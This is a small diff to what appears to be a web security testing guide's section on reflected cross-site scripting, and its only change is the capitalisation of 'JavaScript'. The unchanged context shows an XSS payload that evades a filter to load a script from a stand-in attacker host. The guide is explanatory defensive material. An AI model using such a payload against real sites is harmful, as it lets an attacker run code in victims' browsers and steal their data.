@@ -158,7 +158,7 @@ which is a common attack. But, in this case, it is possible to bypass the saniti
 
 `http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>`
 
-This will exploit the reflected cross site scripting vulnerability shown before, executing the javascript code stored on the attacker's web server as if it was originating from the victim web site, `http://example/`.
+This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker's web server as if it was originating from the victim web site, `http://example/`.
 
 #### Example 7: HTTP Parameter Pollution (HPP)
 
